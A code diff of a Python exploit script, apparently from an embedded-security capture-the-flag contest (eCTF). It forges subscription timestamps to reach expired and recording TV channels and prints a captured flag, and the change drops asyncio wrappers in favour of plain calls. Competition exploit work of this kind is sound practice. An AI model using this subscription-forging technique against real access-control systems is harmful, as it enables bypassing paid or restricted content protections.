@@ -2,7 +2,6 @@
 # forge subscription timestamp
 # for expired and recording scenarios
 
-import asyncio
 import os
 import sys
 
@@ -27,7 +26,7 @@ def forge_timestamp(subscription, channel):
     return new_subscription
 
 
-async def main():
+def main():
     r = conn()
     listing = r.list()
 
@@ -41,24 +40,20 @@ async def main():
         channel_2_sub = f.read()
 
     try:
-        await asyncio.wait_for(
-            asyncio.to_thread(r.subscribe, forge_timestamp(channel_1_sub, channel_1)), 5
-        )
-        await asyncio.wait_for(
-            asyncio.to_thread(r.subscribe, forge_timestamp(channel_2_sub, channel_2)), 5
-        )
+        r.subscribe(forge_timestamp(channel_1_sub, channel_1))
+        r.subscribe(forge_timestamp(channel_2_sub, channel_2))
     except ValueError:
         print("couldn't find timestamp offset")
         return
 
-    flag = await recording_playback()
+    flag = recording_playback()
     if flag:
         print(f"POTENTIAL FLAG: ectf{{recording_{flag}}}")
 
     # expired
     tv = LimitedAttackTV(
         os.environ["IP"],
-        int(os.environ[f"CHANNEL_2_PORT"]),
+        int(os.environ["CHANNEL_2_PORT"]),
         "/dev/ttyACM0",
     )
     tv.run()
